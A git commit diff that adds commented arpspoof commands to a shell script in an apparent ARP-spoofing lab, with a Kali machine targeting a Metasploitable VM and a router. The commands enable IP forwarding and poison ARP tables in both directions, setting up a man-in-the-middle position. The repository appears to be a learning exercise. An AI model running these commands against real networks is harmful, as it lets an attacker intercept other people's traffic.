c838808ae8f1c5d33f90f0088bf898aa67b9be74
hellcard <wseven347.devopser@gmail.com>
2025-01-04 22:18:29 -0700

    Update tab-2.sh

--- arp-spoofing-attck/kali/tab-2.sh
+++ arp-spoofing-attck/kali/tab-2.sh
@@ -1,3 +1,10 @@
 # Tab-2
 sudo -i
 echo 1 > /proc/sys/net/ipv4/ip_forward # permission to forward packets on behalf of other machines
+arpspoof -i eth0 -t 192.168.1.101 192.168.1.1 # generate several fake arp responses
+# -i -> interface, since I work with virtual machines, they are connected via the eth0 (ethernet) interface, but arpspoof also supports Wi-Fi spoofing, only instead of eth0 you need to register wlan
+# -t -> after -t we enter the IP addresses
+# in the output we can see the MAC-adress of kali, the MAC-adress of the "victim" metasploitable, the type field indicating the packet transmission interface, the total number of bytes in eth0 and a summary of the fake arp response
+# you just need to run and wait a little to generate arp responses to ensure the constant presence of false information in the arp table
+^C
+arpspoof -i eth0 -t 192.168.1.1 192.168.1.101 # generate packets to deceive the router
